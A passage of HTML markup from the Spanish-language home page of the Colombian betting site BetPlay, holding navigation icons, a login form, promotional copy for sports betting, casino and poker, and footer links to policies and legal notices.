                          d="M4425.366,2016.5h-6.348a.608.608,0,0,0-.608.608c0,1.176-.864,1.772-2.566,1.772s-2.566-.6-2.566-1.772a.608.608,0,0,0-.608-.608h-6.348a.608.608,0,0,0-.608.608v19.586l-3.789,3.79a4.7,4.7,0,0,0-1.765,3.6V2054.4h1.216v-10.316a3.556,3.556,0,0,1,1.409-2.744l2.929-2.929v4.628l-2.2,2.2.859.86,6.348-6.348c.176-.176.294-.167.333-.164a.676.676,0,0,1,.383.221,2.281,2.281,0,0,1,.012,3.051l-1.587,1.587a.609.609,0,0,0-.178.43v1.587a3.369,3.369,0,0,1-2.687,3.359v1.216a4.562,4.562,0,0,0,3.7-3.174h2.952v.186c0,1.846-2.117,3.465-2.138,3.481a.609.609,0,0,0-.243.486v2.38h1.216v-2.091c.654-.557,2.381-2.221,2.381-4.257v-.186h10.5a.608.608,0,0,0,.608-.608v-30.153A.608.608,0,0,0,4425.366,2016.5Zm-14.479,30.153c0-.063.01-.121.01-.185v-1.335l1.408-1.409a3.517,3.517,0,0,0-.011-4.771,1.845,1.845,0,0,0-1.144-.573,1.6,1.6,0,0,0-1.292.516l-2.93,2.93v-17.762h2.566v-1.216h-2.566v-5.132h5.183c.271,1.522,1.6,2.38,3.731,2.38s3.46-.859,3.73-2.38h5.184v5.132h-1.773v1.216h1.773v22.589Z"
                          fill="#fff"></path>
                        <rect id="Rectángulo_1589" data-name="Rectángulo 1589" width="2.38" height="1.216"
                          transform="translate(4411.083 2022.848)" fill="#fff"></rect>
                        <rect id="Rectángulo_1590" data-name="Rectángulo 1590" width="2.38" height="1.216"
                          transform="translate(4415.05 2022.848)" fill="#fff"></rect>
                        <rect id="Rectángulo_1591" data-name="Rectángulo 1591" width="2.38" height="1.216"
                          transform="translate(4419.018 2022.848)" fill="#fff"></rect>
                      </g>
                    </svg></li>
                </a><!----><a data-menu-item="Estadísticas" target="_blank" href="https://s5.sir.sportradar.com/betplay"
                  class="ng-star-inserted" style="">
                  <li><svg id="Componente_53_8" data-name="Componente 53 – 8" xmlns="http://www.w3.org/2000/svg"
                      width="145.067" height="26.625" viewBox="0 0 153.067 29.625"><text id="Estadísticas"
                        transform="translate(62.067 19.619)" fill="#fff" font-size="15"
                        font-family="Montserrat-Medium, Montserrat" font-weight="500">
                        <tspan x="0" y="0"> Estadísticas </tspan>
                      </text>
                      <g id="Grupo_2335" data-name="Grupo 2335" transform="translate(-120.508 -179.776)">
                        <g id="Grupo_2335-2" data-name="Grupo 2335" transform="translate(120.508 195.688)">
                          <path id="Trazado_1988" data-name="Trazado 1988"
                            d="M125.928,346.553h-4.862a.558.558,0,0,1-.559-.559V333.4a.558.558,0,0,1,.559-.559h4.862a.558.558,0,0,1,.559.559v12.6A.558.558,0,0,1,125.928,346.553Zm-4.3-1.117h3.744V333.957h-3.744Z"
                            transform="translate(-120.508 -332.84)" fill="#fff"></path>
                        </g>
                        <g id="Grupo_2336" data-name="Grupo 2336" transform="translate(127.371 190.163)">
                          <path id="Trazado_1989" data-name="Trazado 1989"
                            d="M191.946,298.93h-4.862a.558.558,0,0,1-.559-.559V280.251a.558.558,0,0,1,.559-.559h4.862a.558.558,0,0,1,.559.559v18.121A.558.558,0,0,1,191.946,298.93Zm-4.3-1.117h3.744v-17h-3.744Z"
                            transform="translate(-186.526 -279.692)" fill="#fff"></path>
                        </g>
                        <g id="Grupo_2337" data-name="Grupo 2337" transform="translate(134.62 184.748)">
                          <path id="Trazado_1990" data-name="Trazado 1990"
                            d="M261.685,252.256h-4.862a.558.558,0,0,1-.559-.559V228.162a.558.558,0,0,1,.559-.559h4.862a.558.558,0,0,1,.559.559V251.7A.558.558,0,0,1,261.685,252.256Zm-4.3-1.117h3.744V228.72h-3.744Z"
                            transform="translate(-256.265 -227.603)" fill="#fff"></path>
                        </g>
                        <g id="Grupo_2338" data-name="Grupo 2338" transform="translate(141.87 179.776)">
                          <path id="Trazado_1991" data-name="Trazado 1991"
                            d="M331.422,209.4h-4.862a.558.558,0,0,1-.559-.559V180.335a.558.558,0,0,1,.559-.559h4.862a.558.558,0,0,1,.559.559v28.508A.558.558,0,0,1,331.422,209.4Zm-4.3-1.117h3.744v-27.39h-3.744Z"
                            transform="translate(-326.002 -179.776)" fill="#fff"></path>
                        </g>
                      </g>
                    </svg></li>
                </a><!----><a data-menu-item="Ayuda" href="/faq" class="ng-star-inserted" style="">
                  <li class="d-block"><svg id="Componente_53_9" data-name="Componente 53 – 9"
                      xmlns="http://www.w3.org/2000/svg" width="100.229" height="28.547"
                      viewBox="0 0 109.229 32.547"><text id="Ayuda" transform="translate(60.229 21.079)" fill="#fff"
                        font-size="15" font-family="Montserrat-Medium, Montserrat" font-weight="500">
                        <tspan x="0" y="0"> Ayuda </tspan>
                      </text>
                      <g id="Grupo_2340" data-name="Grupo 2340" transform="translate(-767.721 -416.398)">
                        <path id="Trazado_2003" data-name="Trazado 2003"
                          d="M778.285,423.06a.606.606,0,1,0,.606.606A.606.606,0,0,0,778.285,423.06Z"
                          transform="translate(-7.388 -4.943)" fill="#fff"></path>
                        <path id="Trazado_2004" data-name="Trazado 2004"
                          d="M790.546,423.06a.606.606,0,1,0,.606.606A.606.606,0,0,0,790.546,423.06Z"
                          transform="translate(-16.484 -4.943)" fill="#fff"></path>
                        <path id="Trazado_2005" data-name="Trazado 2005"
                          d="M802.807,423.06a.606.606,0,1,0,.606.606A.606.606,0,0,0,802.807,423.06Z"
                          transform="translate(-25.581 -4.943)" fill="#fff"></path>
                        <path id="Trazado_2006" data-name="Trazado 2006"
                          d="M860.592,488.033a.8.8,0,0,0-.585.233.771.771,0,0,0-.238.574.749.749,0,0,0,.247.6.851.851,0,0,0,.576.214.822.822,0,0,0,.563-.216.756.756,0,0,0,.244-.6.8.8,0,0,0-.807-.807Z"
                          transform="translate(-68.29 -53.146)" fill="#fff"></path>
                        <path id="Trazado_2007" data-name="Trazado 2007"
                          d="M856.88,462.842a3.16,3.16,0,0,0-1.386-.29,3.031,3.031,0,0,0-1.478.347,2.541,2.541,0,0,0-.963.874,1.956,1.956,0,0,0-.33,1.042.654.654,0,0,0,.208.463.687.687,0,0,0,.512.214q.514,0,.7-.612a2.393,2.393,0,0,1,.476-.885,1.149,1.149,0,0,1,.877-.3,1.176,1.176,0,0,1,.831.3.957.957,0,0,1,.322.731.83.83,0,0,1-.106.411,1.56,1.56,0,0,1-.26.344q-.155.154-.5.457a8.558,8.558,0,0,0-.628.6,1.919,1.919,0,0,0-.514,1.372.723.723,0,0,0,.192.547.658.658,0,0,0,.474.184.6.6,0,0,0,.644-.563q.06-.265.089-.371a1.147,1.147,0,0,1,.084-.211,1.2,1.2,0,0,1,.165-.233,3.761,3.761,0,0,1,.3-.295q.665-.6.923-.847a2.464,2.464,0,0,0,.444-.6,1.675,1.675,0,0,0,.187-.807,1.933,1.933,0,0,0-.328-1.082A2.25,2.25,0,0,0,856.88,462.842Z"
                          transform="translate(-63.063 -34.242)" fill="#fff"></path>
                        <path id="Trazado_2008" data-name="Trazado 2008"
                          d="M800.333,425.416h-5.149V418.94a2.545,2.545,0,0,0-2.542-2.542H770.263a2.545,2.545,0,0,0-2.542,2.542V446.4a2.545,2.545,0,0,0,2.542,2.542h22.378a2.545,2.545,0,0,0,2.542-2.542v-6.476h5.149a2.731,2.731,0,0,0,2.728-2.728v-9.055A2.731,2.731,0,0,0,800.333,425.416Zm-31.321-6.476a1.253,1.253,0,0,1,1.252-1.252h22.378a1.253,1.253,0,0,1,1.252,1.252v.669H769.012ZM793.893,446.4a1.253,1.253,0,0,1-1.252,1.252H770.263a1.253,1.253,0,0,1-1.252-1.252V420.9h24.881v4.516H784.4a2.731,2.731,0,0,0-2.728,2.728V437.2a2.752,2.752,0,0,0,2.083,2.651v1.962a1.088,1.088,0,0,0,.6.974,1.1,1.1,0,0,0,.5.12,1.088,1.088,0,0,0,.642-.209l3.811-2.769h4.59Zm7.878-9.2a1.439,1.439,0,0,1-1.438,1.438H788.884l-3.838,2.789v-2.789H784.4a1.439,1.439,0,0,1-1.438-1.438v-9.055a1.439,1.439,0,0,1,1.438-1.438h15.932a1.439,1.439,0,0,1,1.438,1.438Z"
                          transform="translate(0 0)" fill="#fff"></path>
                      </g>
                    </svg></li>
                </a><!----><!---->
                <hr class="lineas"><a data-menu-item="BetPlay_plus" target="_blank" href="https://ott.betplay.com.co"
                  class="ng-star-inserted" style="">
                </a><!----><a data-menu-item="BetPlay_responsable" routerlink="juego-responsable"
                  href="/juego-responsable" class="ng-star-inserted" style="">
                </a><!---->
                <hr class="lineas"><a target="_blank" href="https://d7cul3678ytm6.cloudfront.net/Betplay/index.html"
                  class="ng-star-inserted" style="">
                  <li class="d-block"><svg xmlns="http://www.w3.org/2000/svg" width="123.879" height="25.127"
                      viewBox="0 0 123.879 25.127">
                      <g id="Componente_45_3" data-name="Componente 45 – 3" transform="translate(0.75 0.75)"><text
                          id="Te_Llamamos" data-name="Te Llamamos" transform="translate(78.129 17.218)" fill="#fff"
                          font-size="13" font-family="Montserrat-Medium, Montserrat" font-weight="500"
                          letter-spacing="0.012em">
                          <tspan x="-44.557" y="0"> Te Llamamos </tspan>
                        </text>
                        <g id="support">
                          <path id="Rectángulo_31" data-name="Rectángulo 31"
                            d="M2.764,0H4.109a0,0,0,0,1,0,0V7.191a0,0,0,0,1,0,0H2.764A2.764,2.764,0,0,1,0,4.427V2.764A2.764,2.764,0,0,1,2.764,0Z"
                            transform="translate(0 8.218)" fill="none" stroke="#fff" stroke-miterlimit="10"
                            stroke-width="1.5"></path>
                          <path id="Rectángulo_32" data-name="Rectángulo 32"
                            d="M2.764,0H4.109a0,0,0,0,1,0,0V7.191a0,0,0,0,1,0,0H2.764A2.764,2.764,0,0,1,0,4.427V2.764A2.764,2.764,0,0,1,2.764,0Z"
                            transform="translate(23.627 15.409) rotate(180)" fill="none" stroke="#fff"
                            stroke-miterlimit="10" stroke-width="1.5"></path>
                          <path id="Trazado_903" data-name="Trazado 903"
                            d="M1380.539,248.4v2.055a5.346,5.346,0,0,1-5.136,5.137h-2.055"
                            transform="translate(-1359.994 -232.993)" fill="none" stroke="#fff" stroke-miterlimit="10"
                            stroke-width="1.5"></path>
                          <path id="Trazado_904" data-name="Trazado 904"
                            d="M1371.257,258.749h-1.027a1.027,1.027,0,0,1-1.026-1.027h0a1.026,1.026,0,0,1,1.026-1.027h1.027a1.026,1.026,0,0,1,1.027,1.027h0A1.027,1.027,0,0,1,1371.257,258.749Z"
                            transform="translate(-1358.93 -235.121)" fill="none" stroke="#fff" stroke-miterlimit="10"
                            stroke-width="1.5"></path>
                          <path id="Trazado_905" data-name="Trazado 905"
                            d="M1360.911,235.892v-1.027a7.191,7.191,0,0,1,7.19-7.191h1.028a7.191,7.191,0,0,1,7.191,7.191v1.027"
                            transform="translate(-1356.802 -227.673)" fill="none" stroke="#fff" stroke-miterlimit="10"
                            stroke-width="1.5"></path>
                        </g>
                      </g>
                    </svg></li>
                </a><!----><a target="_blank" href="https://betplay.chat.apifycloud.com/">
                  <li class="d-block"><svg xmlns="http://www.w3.org/2000/svg" width="68.08" height="20.85"
                      viewBox="0 0 68.08 20.85">
                      <g id="Componente_46_3" data-name="Componente 46 – 3" transform="translate(0.749 0.75)"><text
                          id="Chat" transform="translate(51.331 13)" fill="#fff" font-size="13"
                          font-family="Montserrat-Medium, Montserrat" font-weight="500" letter-spacing="0.012em">
                          <tspan x="-15.938" y="0"> Chat </tspan>
                        </text>
                        <g id="Grupo_1396" data-name="Grupo 1396" transform="translate(-38.159 -148.782)">
                          <path id="Trazado_1380" data-name="Trazado 1380"
                            d="M1124.062,227.673h11.426a6.233,6.233,0,0,1,6.233,6.233v2.078a6.233,6.233,0,0,1-6.233,6.232h-11.426l-6.233,4.156V233.906A6.233,6.233,0,0,1,1124.062,227.673Z"
                            transform="translate(-1079.67 -78.891)" fill="none" stroke="#fff" stroke-linecap="round"
                            stroke-miterlimit="10" stroke-width="1.5"></path>
                          <line id="Línea_111" data-name="Línea 111" x2="12.465" transform="translate(44.392 153.976)"
                            fill="none" stroke="#fff" stroke-linecap="round" stroke-miterlimit="10" stroke-width="1.5">
                          </line>
                          <line id="Línea_112" data-name="Línea 112" x2="12.465" transform="translate(44.392 158.131)"
                            fill="none" stroke="#fff" stroke-linecap="round" stroke-miterlimit="10" stroke-width="1.5">
                          </line>
                        </g>
                      </g>
                    </svg></li>
                </a><a target="_blank" href="https://d7cul3678ytm6.cloudfront.net/Betplay/escribenos.html">
                  <li class="d-block"><svg xmlns="http://www.w3.org/2000/svg" width="105.773" height="17.48"
                      viewBox="0 0 105.773 17.48">
                      <g id="Componente_47_3" data-name="Componente 47 – 3" transform="translate(0.75)"><text
                          id="Escríbenos" transform="translate(68.024 13)" fill="#fff" font-size="13"
                          font-family="Montserrat-Medium, Montserrat" font-weight="500" letter-spacing="0.012em">
                          <tspan x="-36.653" y="0"> Escríbenos </tspan>
                        </text>
                        <g id="email" transform="translate(0 0.799)">
                          <path id="Trazado_1206" data-name="Trazado 1206"
                            d="M1074.363,1962.913v13.941a2,2,0,0,1-1.991,1.991h-17.923a2,2,0,0,1-1.992-1.991v-13.941"
                            transform="translate(-1052.457 -1962.913)" fill="none" stroke="#fff" stroke-linecap="round"
                            stroke-linejoin="round" stroke-width="1.5"></path>
                          <path id="Trazado_1207" data-name="Trazado 1207"
                            d="M1074.363,1962.913l-9.782,7.608a2.1,2.1,0,0,1-2.342,0l-9.782-7.608Z"
                            transform="translate(-1052.457 -1962.913)" fill="none" stroke="#fff" stroke-linecap="round"
                            stroke-linejoin="round" stroke-width="1.5"></path>
                          <line id="Línea_107" data-name="Línea 107" x2="21.906" transform="translate(0 0)" fill="none"
                            stroke="#fff" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"></line>
                        </g>
                      </g>
                    </svg></li>
                </a>
              </ul>
            </nav>
          </app-navbar></div>
      </mat-drawer>
      <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div><mat-drawer-content
        ngskiphydration="" class="mat-drawer-content ng-star-inserted">
        <div _ngcontent-serverapp-c1557493016=""><app-header _ngcontent-serverapp-c1557493016=""
            class="ng-tns-c1557493016-0" _nghost-serverapp-c3829797790="">
            <header _ngcontent-serverapp-c3829797790="" id="header" class="header pt-3 pb-3 p-md-0 ng-star-inserted">
              <div _ngcontent-serverapp-c3829797790="" class="headernavs">
                <div _ngcontent-serverapp-c3829797790=""><button _ngcontent-serverapp-c3829797790=""
                    class="d-block text-white menu-button"><i _ngcontent-serverapp-c3829797790=""
                      class="fas fa-bars"></i></button></div>
                <div _ngcontent-serverapp-c3829797790="" class="headerlogo"><a _ngcontent-serverapp-c3829797790=""
                    class="ng-star-inserted"><img _ngcontent-serverapp-c3829797790="" class="logo"
                      style="right: 30%;" src="img\betcol.png" alt=""
                      title=""></a><!----><!----></div>
                <div _ngcontent-serverapp-c3829797790="" class="headerloginresponsive ng-star-inserted">
                  <div _ngcontent-serverapp-c3829797790="" ngbdropdown="" placement="bottom-right"
                    class="w-100 text-center"><button _ngcontent-serverapp-c3829797790="" id="dropdownLogin"
                      class="btn-inicio w-100 mb-2 no-row"> Iniciar sesión </button></div>
                  <div _ngcontent-serverapp-c3829797790="" class="text-center w-100"><button
                      _ngcontent-serverapp-c3829797790="" id="register" class="btn-registro w-100" tabindex="0">
                      Registrarse </button></div>
                </div><!---->
                <div _ngcontent-serverapp-c3829797790="" class="headerlogin ng-star-inserted"><app-login
                    _ngcontent-serverapp-c3829797790="" _nghost-serverapp-c2129232468="">
                    <form _ngcontent-serverapp-c2129232468="" novalidate="" autocomplete="off" id="formLogin"
                      class="formularioinput align-items-center d-block ng-star-inserted ng-dirty ng-touched ng-valid">
                      <div _ngcontent-serverapp-c2129232468="" class="mb-0 w-100"><input
                          _ngcontent-serverapp-c2129232468="" type="text" id="txtUsuario" formcontrolname="userName"
                          class="inciosesion ng-dirty ng-valid ng-touched" placeholder="Usuario / Cédula"><!---->
                      </div>
                      <div _ngcontent-serverapp-c2129232468="" class="mb-0 w-100"><input
                          _ngcontent-serverapp-c2129232468="" type="password" id="txtPass" formcontrolname="password"
                          class="inciosesion ng-dirty ng-valid ng-touched" placeholder="Contraseña"><!----></div>
                      <div _ngcontent-serverapp-c2129232468="" class="formularioinput-botones"><button
                          _ngcontent-serverapp-c2129232468="" id="btnUsuario" data-callback="successSubmit"
                          type="submit" class="w-100 btn-inicio betplaycaptcha"> Ingresar <!----></button><button
                          _ngcontent-serverapp-c2129232468="" id="btnLoginReal" type="submit"
                          style="position: fixed; left: -9999px;"></button><a _ngcontent-serverapp-c2129232468=""
                          href=" " class="w-100"><button _ngcontent-serverapp-c2129232468="" type="button"
                            class="btn-registro m-0 w-100"> Registrarse </button></a></div>
                      <p _ngcontent-serverapp-c2129232468="" class="text-center mb-0 recuperarpass"><span
                          _ngcontent-serverapp-c2129232468="" class="btn btn-link text-recuperarpass cursor-pointer">
                          Recuperar contraseña </span></p>
                    </form><!---->
                  </app-login></div><!----><!---->
              </div>
            </header><!---->
          </app-header>
          <!----><router-outlet _ngcontent-serverapp-c1557493016="" class="ng-tns-c1557493016-0"></router-outlet><!---->
          <div _ngcontent-serverapp-c1557493016="" class="containersports ng-tns-c1557493016-0 d-none">
            <div _ngcontent-serverapp-c1557493016="" id="KambiBC" class="col-12 ps-2 ng-tns-c1557493016-0 d-none"></div>
          </div><app-home _ngcontent-serverapp-c1557493016="" _nghost-serverapp-c170135771=""
            class="ng-tns-c1557493016-0 ng-star-inserted">
            <div _ngcontent-serverapp-c170135771="" class="home">
              <div _ngcontent-serverapp-c170135771="" class="bg-home-image homedisp">
                <div _ngcontent-serverapp-c170135771="" class="content-first-carousel"><!----></div>
                <div _ngcontent-serverapp-c170135771="" class="apuestale">
                  <h1 _ngcontent-serverapp-c170135771="" class="play-title text-center text-white"> Entra al mundo de
                    ganadores BetPlay, diviértete apostando con toda la oferta de apuestas que tenemos para ti. </h1>
                  <div _ngcontent-serverapp-c170135771="" class="fw-bold text-center w-100"><a
                      _ngcontent-serverapp-c170135771="">
                      <div _ngcontent-serverapp-c170135771="" class="btn btn-success mt-4 play-btn">
                        <h2 _ngcontent-serverapp-c170135771="" class="fw-bold my-1"> ¡Juega Ya! </h2>
                      </div>
                    </a></div>
                </div>
                <div _ngcontent-serverapp-c170135771="" class="homeenlaces">
                  <div _ngcontent-serverapp-c170135771="" class="bordes">
                    <div _ngcontent-serverapp-c170135771="" class="bordesinfo">
                      <h2 _ngcontent-serverapp-c170135771="" class="hometitulos"> 1. Regístrate </h2>
                      <h3 _ngcontent-serverapp-c170135771="" class="hometextos"> Abre tu cuenta GRATIS </h3>
                    </div><!----><a _ngcontent-serverapp-c170135771="" href="" class="ng-star-inserted"><i
                        _ngcontent-serverapp-c170135771="" class="fa fa-chevron-right betboton"></i></a><!---->
                  </div>
                  <div _ngcontent-serverapp-c170135771="" class="bordes">
                    <div _ngcontent-serverapp-c170135771="" class="bordesinfo">
                      <h2 _ngcontent-serverapp-c170135771="" class="hometitulos"> 2. Recarga </h2>
                      <h3 _ngcontent-serverapp-c170135771="" class="hometextos"> Disfruta de la mejor oferta de apuestas
                        online del mercado </h3>
                    </div><!----><a _ngcontent-serverapp-c170135771="" class="ng-star-inserted"><i
                        _ngcontent-serverapp-c170135771="" class="fa fa-chevron-right betboton"></i></a><!---->
                  </div>
                  <div _ngcontent-serverapp-c170135771="" class="bordes">
                    <div _ngcontent-serverapp-c170135771="" class="bordesinfo">
                      <h2 _ngcontent-serverapp-c170135771="" class="hometitulos"> 3. Apuesta y Gana </h2>
                      <h3 _ngcontent-serverapp-c170135771="" class="hometextos"> Diviértete en la casa de apuestas más
                        grande de Colombia </h3>
                    </div><a _ngcontent-serverapp-c170135771=""><i _ngcontent-serverapp-c170135771=""
                        class="fa fa-chevron-right betboton"></i></a>
                  </div>
                </div>
                <div _ngcontent-serverapp-c170135771="" class="homejuegos">
                  <div _ngcontent-serverapp-c170135771="" class="homejuegosunitario">
                    <figure _ngcontent-serverapp-c170135771="" class="homehuegoscontenedor"><img
                        _ngcontent-serverapp-c170135771="" src="img/home/Chicos_Sports.png"
                        alt="Betplay deportes" title="Betplay Casino" class="homejuegosimagen"></figure>
                    <div _ngcontent-serverapp-c170135771="" class="homejuegostexto"><img
                        _ngcontent-serverapp-c170135771="" src="img/home/sports.svg"
                        alt="deportes:basquetball,fútbol, vóleybol y tenis" title="Sports" style="margin-bottom: 2%;">
                      <h4 _ngcontent-serverapp-c170135771="" class="homejuegosdesc"> Juega ahora en la casa de apuestas
                        más grande de Colombia y siente la pasión de apostar en nuestras ofertas deportivas con las
                        mejores cuotas del mercado. </h4><a _ngcontent-serverapp-c170135771="">
                        <div _ngcontent-serverapp-c170135771="" class="btn btn-success mt-4 play-btn">
                          <h3 _ngcontent-serverapp-c170135771="" class="fw-bold my-1"> ¡Juega Ya! </h3>
                        </div>
                      </a>
                    </div>
                  </div>
                  <div _ngcontent-serverapp-c170135771="" class="homejuegosunitario">
                    <div _ngcontent-serverapp-c170135771="" class="homejuegostexto casinostexto"><img
                        _ngcontent-serverapp-c170135771="" src="img/home/casino.svg"
                        alt="betplay casino" title="Betplay Casino" style="margin-bottom: 2%;">
                      <h4 _ngcontent-serverapp-c170135771="" class="homejuegosdesc"> Diversión y miles de posibilidades
                        de ganar las encuentras en el Casino BetPlay con el mejor portafolio de juegos de azar de la
                        categoría. </h4><a _ngcontent-serverapp-c170135771="">
                        <div _ngcontent-serverapp-c170135771="" class="btn btn-success mt-4 play-btn">
                          <h3 _ngcontent-serverapp-c170135771="" class="fw-bold my-1"> ¡Juega Ya! </h3>
                        </div>
                      </a>
                    </div>
                    <figure _ngcontent-serverapp-c170135771="" class="homehuegoscontenedor"><img
                        _ngcontent-serverapp-c170135771="" src="img/home/Chica_Casino.png"
                        alt="casino, dados , juegos de azar" title="Casino" class="homejuegosimagen casinoimg"></figure>
                  </div>
                  <div _ngcontent-serverapp-c170135771="" class="homejuegosunitario">
                    <figure _ngcontent-serverapp-c170135771="" class="homehuegoscontenedor"><img
                        _ngcontent-serverapp-c170135771="" src="img/home/Personaje.png"
                        alt="hombre jugando con cartas" title="Poker" class="homejuegosimagen"></figure>
                    <div _ngcontent-serverapp-c170135771="" class="homejuegostexto"><img
                        _ngcontent-serverapp-c170135771="" src="img/home/poker.svg" alt="betplay poker"
                        title="Betplay Poker" style="margin-bottom: 2%;">
                      <h4 _ngcontent-serverapp-c170135771="" class="homejuegosdesc"> Juega, apuesta y gana en el Póker
                        de Betplay, y conviértete en un maestro dominando las diferentes modalidades de Póker que
                        tenemos para ti. </h4><a _ngcontent-serverapp-c170135771="">
                        <div _ngcontent-serverapp-c170135771="" class="btn btn-success mt-4 play-btn">
                          <h3 _ngcontent-serverapp-c170135771="" class="fw-bold my-1"> ¡Juega Ya! </h3>
                        </div>
                      </a>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </app-home><!----><!----><app-footer _ngcontent-serverapp-c1557493016="" class="ng-tns-c1557493016-0"
            _nghost-serverapp-c3637729144="">
            <footer _ngcontent-serverapp-c3637729144="" class="footer ng-star-inserted">
              <div _ngcontent-serverapp-c3637729144="" class="footer-content">
                <div _ngcontent-serverapp-c3637729144="" class="footer-top">
                  <div _ngcontent-serverapp-c3637729144="" class="footer-links">
                    <div _ngcontent-serverapp-c3637729144="" class="footer-section ng-star-inserted">
                      <div _ngcontent-serverapp-c3637729144="" class="footer-header">
                        <p _ngcontent-serverapp-c3637729144="" class="footer-title">Políticas</p>
                        <div _ngcontent-serverapp-c3637729144="" class="footer-image"><img
                            _ngcontent-serverapp-c3637729144="" src="img/footer/plus-icon.svg"
                            alt="Políticas"></div>
                      </div>
                      <div _ngcontent-serverapp-c3637729144="" class="footer-content multi-column">
                        <ul _ngcontent-serverapp-c3637729144="">
                          <li _ngcontent-serverapp-c3637729144="" class="ng-star-inserted"><a
                              _ngcontent-serverapp-c3637729144="" href="/static/about">¿Quienes somos?</a></li>
                          <!----><!---->
                          <li _ngcontent-serverapp-c3637729144="" class="ng-star-inserted"><a
                              _ngcontent-serverapp-c3637729144="" href="/static/acuerdo-5-16-coljuegos">Acuerdo 05</a>
                          </li><!----><!---->
                          <li _ngcontent-serverapp-c3637729144="" class="ng-star-inserted"><a
                              _ngcontent-serverapp-c3637729144="" href="/static/acuerdo-02">Acuerdo 02</a></li>
                          <!----><!---->
                          <li _ngcontent-serverapp-c3637729144="" class="ng-star-inserted"><a
                              _ngcontent-serverapp-c3637729144="" href="/faq">Ayuda</a></li><!----><!---->
                          <li _ngcontent-serverapp-c3637729144="" class="ng-star-inserted"><a
                              _ngcontent-serverapp-c3637729144="" href="/static/politica-de-cookies">Política de
                              cookies</a></li><!----><!---->
                          <li _ngcontent-serverapp-c3637729144="" class="ng-star-inserted"><a
                              _ngcontent-serverapp-c3637729144="" href="/static/aviso-legal">Aviso legal</a></li>
                          <!----><!---->
                          <li _ngcontent-serverapp-c3637729144="" class="ng-star-inserted"><a
                              _ngcontent-serverapp-c3637729144="" href="/static/acuerdo-8-16-coljuegos">Acuerdo 08</a>
                          </li><!----><!---->
                          <li _ngcontent-serverapp-c3637729144="" class="ng-star-inserted"><a
                              _ngcontent-serverapp-c3637729144="" href="/static/acuerdo-4-16-coljuegos">Acuerdo 04</a>
                          </li><!----><!---->
                          <li _ngcontent-serverapp-c3637729144="" class="ng-star-inserted"><a
                              _ngcontent-serverapp-c3637729144="" href="/reclamaciones">Reclamaciones</a></li>
                          <!----><!---->
                          <li _ngcontent-serverapp-c3637729144="" class="ng-star-inserted"><a
                              _ngcontent-serverapp-c3637729144="" href="/juego-responsable">Juego responsable</a></li>
                          <!----><!---->
                          <li _ngcontent-serverapp-c3637729144="" class="ng-star-inserted"><a
                              _ngcontent-serverapp-c3637729144="" href="/politica-de-privacidad">Política de protección
                              de datos personales</a></li><!----><!---->
                          <li _ngcontent-serverapp-c3637729144="" class="ng-star-inserted"><a
                              _ngcontent-serverapp-c3637729144="" href="/modalterminos">Aviso de privacidad</a></li>
                          <!----><!----><!---->
                        </ul>
                      </div>
                    </div><!----><!---->
                    <div _ngcontent-serverapp-c3637729144="" class="footer-section ng-star-inserted">
                      <div _ngcontent-serverapp-c3637729144="" class="footer-header">
                        <p _ngcontent-serverapp-c3637729144="" class="footer-title">Más Información</p>
                        <div _ngcontent-serverapp-c3637729144="" class="footer-image"><img
                            _ngcontent-serverapp-c3637729144="" src="img/footer/plus-icon.svg"
                            alt="Más Información"></div>
                      </div>
                      <div _ngcontent-serverapp-c3637729144="" class="footer-content">
                        <ul _ngcontent-serverapp-c3637729144="">
                          <li _ngcontent-serverapp-c3637729144="" class="ng-star-inserted"><a
                              _ngcontent-serverapp-c3637729144="" href="/reglas-apuestas-deportivas">Reglas apuestas
                              deportivas</a></li><!----><!---->
                          <li _ngcontent-serverapp-c3637729144="" class="ng-star-inserted"><a
                              _ngcontent-serverapp-c3637729144="">Formato de solicitud</a></li><!----><!---->
                          <li _ngcontent-serverapp-c3637729144="" class="ng-star-inserted"><a
                              _ngcontent-serverapp-c3637729144="" href="/terminos-y-condiciones">Términos y
                              condiciones</a></li><!----><!----><!---->
                        </ul>
                      </div>
                    </div><!----><!---->
                    <div _ngcontent-serverapp-c3637729144="" class="footer-section ng-star-inserted">
                      <div _ngcontent-serverapp-c3637729144="" class="footer-header">
                        <p _ngcontent-serverapp-c3637729144="" class="footer-title">Experiencia BetPlay</p>
                        <div _ngcontent-serverapp-c3637729144="" class="footer-image"><img
                            _ngcontent-serverapp-c3637729144="" src="img/footer/plus-icon.svg"
                            alt="Experiencia BetPlay"></div>
                      </div>
                      <div _ngcontent-serverapp-c3637729144="" class="footer-content">
                        <ul _ngcontent-serverapp-c3637729144="">
                          <li _ngcontent-serverapp-c3637729144="" class="ng-star-inserted"><a
                              _ngcontent-serverapp-c3637729144="">Deportes</a></li><!----><!---->
                          <li _ngcontent-serverapp-c3637729144="" class="ng-star-inserted"><a
                              _ngcontent-serverapp-c3637729144="" href="/menuusuario?optionMenu=2">Recargas</a></li>
                          <!----><!---->
                          <li _ngcontent-serverapp-c3637729144="" class="ng-star-inserted"><a
                              _ngcontent-serverapp-c3637729144="">Casino</a></li><!----><!---->
                          <li _ngcontent-serverapp-c3637729144="" class="ng-star-inserted"><a
                              _ngcontent-serverapp-c3637729144="" href="/menuusuario?optionMenu=3">Retiros</a></li>
                          <!----><!----><!---->
                        </ul>
                      </div>
                    </div><!----><!----><!----><!----><!---->
                  </div>
                  <div _ngcontent-serverapp-c3637729144="" class="footer-affiliate ng-star-inserted">
                    <h3 _ngcontent-serverapp-c3637729144=""> Haz parte de nuestro equipo </h3>
                    <div _ngcontent-serverapp-c3637729144="" href="https://www.betplay.com.co/afiliados"
                      class="footer-image-affiliate"><a _ngcontent-serverapp-c3637729144="" target="_blank"
                        rel="noopener noreferrer"><img
                          _ngcontent-serverapp-c3637729144="" src="img/footer/betplay-afiliados.svg"
                          alt="afiliados betplay"></a></div>
                  </div><!---->
                </div>
                <div _ngcontent-serverapp-c3637729144="" class="footer-partners"><!----></div>
                <div _ngcontent-serverapp-c3637729144="" class="footer-sponsors"><!----></div>
                <h4 _ngcontent-serverapp-c3637729144="" class="oficcial-sponsors"> PATROCINADORES </h4>
                <div _ngcontent-serverapp-c3637729144="" class="footer-social"><!----></div>
                <div _ngcontent-serverapp-c3637729144="" class="footer-info">
                  <p _ngcontent-serverapp-c3637729144="" class="footer-title"> Contrato N°.C1876 </p>
                  <p _ngcontent-serverapp-c3637729144="" class="footer-text"> Betplay.com.co propiedad de CORREDOR
